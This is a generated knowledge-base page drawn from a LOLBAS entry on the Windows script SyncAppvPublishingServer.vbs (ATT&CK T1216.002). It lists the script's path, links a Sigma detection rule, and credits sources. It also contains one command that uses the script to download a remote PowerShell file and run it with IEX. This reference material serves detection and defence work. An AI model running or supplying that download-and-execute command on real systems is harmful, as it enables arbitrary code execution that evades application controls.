---
title: "Syncappvpublishingserver.vbs"
framework: "lolbas"
generated: "true"
source_path: "yml/OSScripts/Syncappvpublishingserver.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml"
build_date: "2026-04-27 19:14:21"
category: "OSScripts"
aliases:
  - "Syncappvpublishingserver.vbs"
functions:
  - "Execute"
attack_technique_ids:
  - "T1216.002"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Script used related to app-v and publishing server

## Paths

- `C:\Windows\System32\SyncAppvPublishingServer.vbs`

## Commands

### 1. Execute

Inject PowerShell script code with the provided arguments

```cmd
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

- Use Case: Use Powershell host invoked from vbs script
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution#^t1216002-syncappvpublishingserver|T1216.002: SyncAppvPublishingServer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml

## Resources

- {'Link': 'https://twitter.com/monoxgas/status/895045566090010624'}
- {'Link': 'https://twitter.com/subTee/status/855738126882316288'}

## Acknowledgements

- {'Person': 'Nick Landers', 'Handle': '@monoxgas'}
- {'Person': 'Casey Smith', 'Handle': '@subtee'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml)
